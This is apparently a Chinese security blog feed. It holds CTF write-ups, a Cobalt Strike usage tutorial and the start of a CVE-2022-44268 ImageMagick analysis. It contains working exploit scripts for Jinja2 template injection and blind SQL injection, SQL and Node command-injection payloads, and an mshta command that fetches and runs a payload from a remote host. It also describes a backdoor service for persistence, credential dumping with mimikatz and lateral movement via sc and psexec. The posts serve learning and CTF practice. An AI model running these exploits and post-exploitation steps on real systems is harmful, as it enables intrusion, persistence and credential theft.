<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;evalcmd&#x27;)</span><br></pre></td></tr></table></figure>



<h2 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h2><p>参考 <a href="https://paper.seebug.org/1114/">https://paper.seebug.org/1114/</a> tp6 的任意写文件漏洞</p>
<p>写个小马后需要绕过 disable_functions</p>
<p>利用别人的工具 <a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a> 成功 getshell</p>
<h2 id="Flaskapp"><a href="#Flaskapp" class="headerlink" title="Flaskapp"></a>Flaskapp</h2><p>题目考察的是 模板注入 + PIN，但是当时按着 PIN 教程复现不了，好像当时是机器 id 取错了，见官方 wp</p>
<blockquote>
<p>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同，对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup。</p>
</blockquote>
<p>然后当时自己是直接执行命令 getflag 的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#conding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ec_url = <span class="string">&#x27;http://123.57.212.112:10001/&#x27;</span></span><br><span class="line">dc_url = ec_url + <span class="string">&#x27;decode&#x27;</span></span><br><span class="line">proxy = &#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#123;% if [].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;sys&#x27;+&#x27;tem&#x27;](&#x27;ls / &gt; /tmp/test1&#x27;) %&#125;2&#123;% endif %&#125;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open&quot;</span></span><br><span class="line">payload += <span class="string">&quot;(&#x27;this_is_the_fl&#x27;+&#x27;ag.txt&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">r1 = requests.post(url=ec_url,data=&#123;<span class="string">&#x27;text&#x27;</span>:payload&#125;)</span><br><span class="line"><span class="comment"># print(r1.text)</span></span><br><span class="line">b64 = re.findall(<span class="string">r&quot;结果  :(.+)&quot;</span>,r1.text)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="comment"># print(b64)</span></span><br><span class="line"></span><br><span class="line">r2 = requests.post(url=dc_url,data=&#123;<span class="string">&#x27;text&#x27;</span>:b64&#125;)</span><br><span class="line"><span class="built_in">print</span>(r2.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=============================&quot;</span>)</span><br><span class="line">result = re.findall(<span class="string">r&quot;times;&lt;/button&gt;([\d\D]*)&lt;!DOCTYPE html&gt;&quot;</span>,r2.text)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>



<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>被这个 fl4g 坑了好久，一直在考虑暴列明，谁知道可以直接读</p>
<p>payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">flag = <span class="string">&#x27;f&#x27;</span></span><br><span class="line">index = <span class="number">2</span></span><br><span class="line">chset = string.printable</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">for</span> ch <span class="keyword">in</span> chset:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] now ch: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(ch))</span><br><span class="line">		paramsGet = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;if((ascii(mid(fl4g,&#123;&#125;,1)))in(&#123;&#125;),sleep(3),1)&quot;</span>.<span class="built_in">format</span>(index,<span class="built_in">ord</span>(ch))&#125;</span><br><span class="line">		r = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			r = session.get(<span class="string">&quot;http://8539506905a2494b837a7dfc662635f6d7f0286ceecf477f.changame.ichunqiu.com/&quot;</span>, params=paramsGet, timeout=<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">			flag += ch</span><br><span class="line">			index += <span class="number">1</span></span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;[+] flag: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">			<span class="keyword">if</span> ch==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">				exit()</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h2 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h2><p>注册登陆后显示名字，盲猜二次注入，直接贴 payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(0x7e,(select flaaag from flag)),0) or &#x27;</span><br></pre></td></tr></table></figure>



<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>搜了很久找到了 Sim1e 师傅的笔记，看到了他的无列名注入 <a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">https://www.smi1e.top/sql注入笔记/</a></p>
<p>当时直接使用字符串比较会发生奇妙的错误，需要转成十六进制</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://49c9b1c145ed46acb5073a40c428c5fe070ca683e1374ccc.changame.ichunqiu.com/&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">        m = (l+r)//<span class="number">2</span></span><br><span class="line">        p1 = <span class="built_in">str</span>(binascii.hexlify((flag+<span class="built_in">chr</span>(m)).encode()))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">        payload =<span class="string">&#x27;(((select 1,0x%s)&lt;=(select * from `f1ag_1s_h3r3_hhhhh`)))&#x27;</span>%(p1)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        paramsPost = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        res = requests.post(url, data=paramsPost)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = m - <span class="number">1</span></span><br><span class="line">    m = (l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(m-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] flag: %s&quot;</span> % flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike Learn</title>
    <url>/2021/03/10/Cobalt-Strike-Learn/</url>
    <content><![CDATA[<blockquote>
<p>关于Cobalt Strike的基础操作</p>
</blockquote>
<span id="more"></span>

<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><blockquote>
<p>官方文档：<a href="https://www.cobaltstrike.com/aggressor-script/index.html">https://www.cobaltstrike.com/aggressor-script/index.html</a></p>
<p>使用手册翻译版本：<a href="https://wbglil.gitbook.io/cobalt-strike/">https://wbglil.gitbook.io/cobalt-strike/</a></p>
</blockquote>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p>
<p>Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。本期“安仔课堂”，ISEC实验室的陈老师带大家实战操作Cobalt Strike神器的使用。</p>
<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li>agscript拓展应用的脚本</li>
<li>c2lint 用于检查profile的错误异常</li>
<li>teamserver服务端程序</li>
<li>cobaltstrike，cobaltstrike.jar客户端程序(java跨平台)</li>
<li>logs目录记录与目标主机的相关信息</li>
<li>update，update.jar用于更新CS</li>
<li>third-party第三方工具</li>
</ul>
<h3 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h3><blockquote>
<p>若想修改teamserver端口则直接打开teamserver文件修改<code>-Dcobaltstrike.server_port</code>，端口默认为50050</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./teamserver &lt;host&gt; &lt;password&gt;</span><br></pre></td></tr></table></figure>

<h3 id="启动客户端"><a href="#启动客户端" class="headerlink" title="启动客户端"></a>启动客户端</h3><p>Windows下直接打开<code>cobaltstrike.bat</code>文件，填入teamserver的主机，端口和密码，用户名自定义</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100116fe65cc97a7cf8c8db2d3.png" alt="image-20210402003746691" style="zoom: 67%;" />

<h3 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/names</span><br></pre></td></tr></table></figure>

<h3 id="用户通信"><a href="#用户通信" class="headerlink" title="用户通信"></a>用户通信</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/msg &lt;username&gt; &lt;message&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><ul>
<li>Beacon DNS</li>
<li>Beacon HTTP</li>
<li>Beacon HTTPS</li>
<li>Beacon SMB</li>
<li>Beacon TCP</li>
<li>External C2</li>
<li>Foreign HTTP</li>
<li>Foreign HTTPS</li>
</ul>
<blockquote>
<p>Beacon为内置的Listener，即在目标主机执行相应的payload，获取shell到CS上，其中包含DNS、HTTP、SMB</p>
<p>Foreign为外部结合的Listener，常用于MSF的结合，一般用来派生会话到MSF</p>
</blockquote>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="生成hta"><a href="#生成hta" class="headerlink" title="生成hta"></a>生成hta</h3><blockquote>
<p>HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，与VB、C++等程序语言所设计的软件界面没什么差别。HTML Application有三种类型的生成方式，测试发现，只有powershell方式生成的hta文件才能正常执行上线，Executable和VBA方式生成的hta文件执行的时候提示当前页面的脚本发生错误。</p>
</blockquote>
<p>攻击&#x3D;&gt;生成木马&#x3D;&gt;Hta程序</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210510011615ee06389102a6a3844b.png" alt="image-20210402010123793" style="zoom: 67%;" />

<p>选择刚刚创建的监听器，方法有3种，这里选择PowerShell</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117346ce013397cc996ac02.png" alt="image-20210402010225346" style="zoom:67%;" />

<p>利用web服务在受害者机器上下载恶意文件</p>
<p>攻击&#x3D;&gt;钓鱼攻击&#x3D;&gt;文件下载</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117eaf0d6a75ec5d7741815.png" alt="image-20210402010419802" style="zoom:67%;" />

<p>选择刚刚生成的hta程序</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001177a10c44edaf6c2ec5aa3.png" alt="image-20210402010541043" style="zoom:67%;" />

<p>事件会被记录</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117685b5e6fc07412238d0c.png" alt="image-20210402010734975" style="zoom: 67%;" />

<p>在受害者机器上运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mshta http://&lt;host&gt;:80/download/file.ext</span><br></pre></td></tr></table></figure>

<h3 id="生成office宏"><a href="#生成office宏" class="headerlink" title="生成office宏"></a>生成office宏</h3><p>攻击&#x3D;&gt;生成木马&#x3D;&gt;Office宏木马</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001172afe8ea5ed2338dbd04a.png" alt="image-20210402011728626" style="zoom:67%;" />

<p>选择创建的监听器，弹出使用教程</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001171b000eaf2ef852af888a.png" alt="image-20210402011835331" style="zoom:67%;" />

<blockquote>
<p>word开启禁用宏：文件——&gt;选项——&gt;信任中心——&gt;信任中心设置</p>
</blockquote>
<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><p>攻击&#x3D;&gt;生成木马&#x3D;&gt;生成Payload</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117bbd4fc22109d7b7024a0.png" alt="image-20210402011942160" style="zoom:67%;" />

<p>可以选择各种语言的payload，还能勾选是否为64位程序</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117f81bb4fe6b34a9fa2ab4.png" alt="image-20210402012020619" style="zoom:67%;" />

<h3 id="生成分阶段木马"><a href="#生成分阶段木马" class="headerlink" title="生成分阶段木马"></a>生成分阶段木马</h3><blockquote>
<p>Stager是分阶段传送Payload。分阶段的意思是我们生成的Stager马其实是一个小程序，用于从服务器端下载我们真正的shellcode。分阶段在很多时候是很有必要的，因为很多场景对于能加载进内存并成功漏洞利用后执行的数据大小存在严格限制。所以这种时候，我们就不得不利用分阶段传送了。如果不需要分阶段的话，可以在C2的扩展文件里面把host_stage选项设置为false。</p>
</blockquote>
<p>攻击&#x3D;&gt;生成木马&#x3D;&gt;Windows分阶段木马</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001171bba1026c94edae3471f.png" alt="image-20210402012449241" style="zoom:67%;" />

<h3 id="生成无阶段木马"><a href="#生成无阶段木马" class="headerlink" title="生成无阶段木马"></a>生成无阶段木马</h3><blockquote>
<p>Stageless是完整的木马，后续不需要再向服务器端请求shellcode。所以使用这种方法生成的木马会比Stager生成的木马体积要大。但是这种木马有助于避免反溯源，因为如果开启了分阶段传送，任何人都能连接到你的C2服务器请求payload，并分析payload中的配置信息。在CobaltStrike4.0及以后的版本中，后渗透和横向移动绝大部分是使用的Stageless类型的木马。</p>
<p>Windows Executable(S)相比于Windows Executable，其中包含Beacon的完整payload，不需要阶段性的请求，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存。</p>
</blockquote>
<p>攻击&#x3D;&gt;生成木马&#x3D;&gt;Windows无阶段木马</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117924d8eb38aea2f236b67.png" alt="image-20210402012506006" style="zoom:67%;" />

<blockquote>
<p>注意，生成的Windows Service EXE生成的木马，直接双击是不会返回session的。需要以创建服务的方式启动，才会返回session。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#注意，等号（=）后面要有空格</span><br><span class="line">sc create autoRunBackDoor binPath= &quot;<span class="built_in">cmd</span>.exe /c C:\users\administrator\desktop\cs.exe&quot; <span class="built_in">start</span>=auto DisplayName=autoRunBackDoor</span><br><span class="line">#开启某个系统服务</span><br><span class="line">sc <span class="built_in">start</span> autoRunBackDoor </span><br><span class="line">#停止某个系统服务</span><br><span class="line">sc stop autoRunBackDoor </span><br><span class="line"># 删除某个系统服务</span><br><span class="line">sc delete service_name</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="主机深入"><a href="#主机深入" class="headerlink" title="主机深入"></a>主机深入</h2><h3 id="Bypass-UAC提权"><a href="#Bypass-UAC提权" class="headerlink" title="Bypass UAC提权"></a>Bypass UAC提权</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117370e63f46d8d82e2aeab.png" alt="image-20210402012958946" style="zoom:67%;" />

<h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117debdd12b3acdc8770dbf.png" alt="image-20210402013043844" style="zoom:67%;" />

<h3 id="Mimikatz获取密码"><a href="#Mimikatz获取密码" class="headerlink" title="Mimikatz获取密码"></a>Mimikatz获取密码</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210510011742ef27b7bbd481d37ec0.png" alt="image-20210402013104992" style="zoom:67%;" />

<h2 id="联动MSF"><a href="#联动MSF" class="headerlink" title="联动MSF"></a>联动MSF</h2><p>创建Foreign HTTP监听器</p>
<p>MSF使用multi&#x2F;handler进行监听</p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117ef5c46b99f1c7ec218ef.png" alt="image-20210402013643568" style="zoom:67%;" />

<h3 id="共享服务横向移动"><a href="#共享服务横向移动" class="headerlink" title="共享服务横向移动"></a>共享服务横向移动</h3><p>IPC测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell dir \\172.16.35.128\C$</span><br></pre></td></tr></table></figure>

<p>创建SMB Beacon</p>
<p>生成services.exe的Windws无阶段木马</p>
<p>上传到beacon</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload /root/Desktop/beacon.exe</span><br></pre></td></tr></table></figure>

<p>复制beacon到内网机器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell copy beacon.exe \\172.16.35.128\C$\windows\temp</span><br></pre></td></tr></table></figure>

<p>创建beacon服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell sc \\172.16.35.128 creat beacon binpath=c:\windows\temp\beacon.exe</span><br></pre></td></tr></table></figure>

<p>启动beacon服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell sc \\172.16.35.128 start beacon</span><br></pre></td></tr></table></figure>

<p>连接内网机器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">link 172.16.35.128</span><br></pre></td></tr></table></figure>

<h3 id="psexec横向移动"><a href="#psexec横向移动" class="headerlink" title="psexec横向移动"></a>psexec横向移动</h3><blockquote>
<p>如果内网主机无法访问外网</p>
</blockquote>
<p>派生一个Foreign Beacon</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spawn foreign tcp</span><br></pre></td></tr></table></figure>

<p>远程执行beacon</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec 172.16.35.128 C$ beacon smb</span><br></pre></td></tr></table></figure>

<h2 id="脚本管理器"><a href="#脚本管理器" class="headerlink" title="脚本管理器"></a>脚本管理器</h2><p>直接导入cna文件即可</p>
<h2 id="socks4a代理"><a href="#socks4a代理" class="headerlink" title="socks4a代理"></a>socks4a代理</h2><p>点击SOCKS Server，然后在代理攻击上使用SOCKS4，填上主机和端口即可</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001171d7669790f5009fb2c74.png" alt="image-20210402015236996" style="zoom:67%;" />

<p>停止SOCKS Server</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socks stop</span><br></pre></td></tr></table></figure>

<h2 id="CobaltStrike常见命令"><a href="#CobaltStrike常见命令" class="headerlink" title="CobaltStrike常见命令"></a>CobaltStrike常见命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BeaconCommands</span><br><span class="line">===============</span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    browserpivot              注入受害者浏览器进程</span><br><span class="line">    bypassuac                 绕过UAC</span><br><span class="line">    cancel                    取消正在进行的下载</span><br><span class="line">    cd                        切换目录</span><br><span class="line">    checkin                   强制让被控端回连一次</span><br><span class="line">    clear                     清除beacon内部的任务队列</span><br><span class="line">    connect                   Connect to a Beacon peerover TCP</span><br><span class="line">    covertvpn                 部署Covert VPN客户端</span><br><span class="line">    cp                        复制文件</span><br><span class="line">    dcsync                    从DC中提取密码哈希</span><br><span class="line">    desktop                   远程VNC</span><br><span class="line">    dllinject                 反射DLL注入进程</span><br><span class="line">    dllload                   使用LoadLibrary将DLL加载到进程中</span><br><span class="line">    download                  下载文件</span><br><span class="line">    downloads                 列出正在进行的文件下载</span><br><span class="line">    drives                    列出目标盘符</span><br><span class="line">    elevate                   尝试提权</span><br><span class="line">   execute                   在目标上执行程序(无输出)</span><br><span class="line">    execute-assembly          在目标上内存中执行本地.NET程序</span><br><span class="line">    exit                      退出beacon</span><br><span class="line">    getprivs                  Enable system privileges oncurrent token</span><br><span class="line">    getsystem                 尝试获取SYSTEM权限</span><br><span class="line">    getuid                    获取用户ID</span><br><span class="line">    hashdump                  转储密码哈希值</span><br><span class="line">    help                      帮助</span><br><span class="line">    inject                    在特定进程中生成会话</span><br><span class="line">    jobkill                   杀死一个后台任务</span><br><span class="line">    jobs                      列出后台任务</span><br><span class="line">    kerberos_ccache_use       从ccache文件中导入票据应用于此会话</span><br><span class="line">    kerberos_ticket_purge     清除当前会话的票据</span><br><span class="line">    kerberos_ticket_use       从ticket文件中导入票据应用于此会话</span><br><span class="line">    keylogger                 键盘记录</span><br><span class="line">    kill                      结束进程</span><br><span class="line">    link                      Connect to a Beacon peerover a named pipe</span><br><span class="line">    logonpasswords            使用mimikatz转储凭据和哈希值</span><br><span class="line">    ls                        列出文件</span><br><span class="line">    make_token                创建令牌以传递凭据</span><br><span class="line">    mimikatz                  运行mimikatz</span><br><span class="line">    mkdir                     创建一个目录</span><br><span class="line">    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode http                 使用HTTP作为通信通道</span><br><span class="line">    mv                        移动文件</span><br><span class="line">    net                       net命令</span><br><span class="line">    note                      备注      </span><br><span class="line">    portscan                  进行端口扫描</span><br><span class="line">    powerpick                 通过Unmanaged PowerShell执行命令</span><br><span class="line">    powershell                通过powershell.exe执行命令</span><br><span class="line">    powershell-import         导入powershell脚本</span><br><span class="line">    ppid                      Set parent PID forspawned post-ex jobs</span><br><span class="line">    ps                        显示进程列表</span><br><span class="line">    psexec                    Use a service to spawn asession on a host</span><br><span class="line">    psexec_psh                Use PowerShell to spawn asession on a host</span><br><span class="line">    psinject                  在特定进程中执行PowerShell命令</span><br><span class="line">    pth                       使用Mimikatz进行传递哈希</span><br><span class="line">    pwd                       当前目录位置</span><br><span class="line">    reg                       Query the registry</span><br><span class="line">    rev2self                  恢复原始令牌</span><br><span class="line">    rm                        删除文件或文件夹</span><br><span class="line">    rportfwd                  端口转发</span><br><span class="line">    run                       在目标上执行程序(返回输出)</span><br><span class="line">    runas                     以另一个用户权限执行程序</span><br><span class="line">    runasadmin                在高权限下执行程序</span><br><span class="line">    runu                      Execute a program underanother PID</span><br><span class="line">    screenshot                屏幕截图</span><br><span class="line">    setenv                    设置环境变量</span><br><span class="line">    shell                     cmd执行命令</span><br><span class="line">    shinject                  将shellcode注入进程</span><br><span class="line">    shspawn                   生成进程并将shellcode注入其中</span><br><span class="line">    sleep                     设置睡眠延迟时间</span><br><span class="line">    socks                     启动SOCKS4代理</span><br><span class="line">    socks stop                停止SOCKS4</span><br><span class="line">    spawn                     Spawn a session</span><br><span class="line">    spawnas                   Spawn a session as anotheruser</span><br><span class="line">    spawnto                   Set executable tospawn processes into</span><br><span class="line">    spawnu                    Spawn a session underanother PID</span><br><span class="line">    ssh                       使用ssh连接远程主机</span><br><span class="line">    ssh-key                   使用密钥连接远程主机</span><br><span class="line">    steal_token               从进程中窃取令牌</span><br><span class="line">    timestomp                 将一个文件时间戳应用到另一个文件</span><br><span class="line">    unlink                    Disconnect from parentBeacon</span><br><span class="line">    upload                    上传文件</span><br><span class="line">    wdigest                   使用mimikatz转储明文凭据</span><br><span class="line">    winrm                     使用WinRM在主机上生成会话</span><br><span class="line">    wmi                       使用WMI在主机上生成会话</span><br><span class="line">    argue                     进程参数欺骗</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/company-information/167460.html">渗透测试神器Cobalt Strike使用教程</a></p>
<p><a href="https://www.anquanke.com/post/id/235251">CobaltStrike使用详解</a></p>
]]></content>
      <tags>
        <tag>Penertration</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-44268漏洞分析</title>
    <url>/2023/03/03/CVE-2022-44268%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>CVE-2022-44268漏洞分析</p>
</blockquote>
<span id="more"></span>

<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>ImageMagick 7.1.0-49 is vulnerable to Information Disclosure. When it parses a PNG image (e.g., for resize), the resulting image could have embedded the content of an arbitrary file (if the magick binary has permissions to read it).</p>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2022-44268">vulhub环境</a></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>安装依赖</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install pypng</span><br></pre></td></tr></table></figure>

<p>使用<a href="https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2022-44268/poc.py">poc.py</a>生成poc</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python poc.py generate -o poc.png -r /etc/passwd</span><br></pre></td></tr></table></figure>

<p>上传文件并保存新生成的图片为out.png</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/202303031423071.png" alt="image-20230303141135564"></p>
<p>使用<a href="https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2022-44268/poc.py">poc.py</a>提取文件信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python poc.py parse -i out.png</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/202303031430002.png" alt="image-20230303142958960"></p>
<h2 id="PNG组成"><a href="#PNG组成" class="headerlink" title="PNG组成"></a>PNG组成</h2><blockquote>
<p>最好结合<strong>010Editor</strong>进行分析</p>
</blockquote>
<p><strong>PNG数据块</strong></p>
<p>PNG定义了两种数据块，分别为关键数据块和辅助数据块</p>
<table>
<thead>
<tr>
<th><strong>数据块符号</strong></th>
<th><strong>数据块名称</strong></th>
<th><strong>多数据块</strong></th>
<th><strong>可选否</strong></th>
<th><strong>位置限制</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>IHDR</strong></td>
<td>文件头数据块</td>
<td>否</td>
<td>否</td>
<td>第一块</td>
</tr>
<tr>
<td>cHRM</td>
<td>基色和白色点数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE和IDAT之前</td>
</tr>
<tr>
<td>gAMA</td>
<td>图像γ数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE和IDAT之前</td>
</tr>
<tr>
<td>sBIT</td>
<td>样本有效位数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE和IDAT之前</td>
</tr>
<tr>
<td>PLTE</td>
<td>调色板数据块</td>
<td>否</td>
<td>是</td>
<td>在IDAT之前</td>
</tr>
<tr>
<td>bKGD</td>
<td>背景颜色数据块</td>
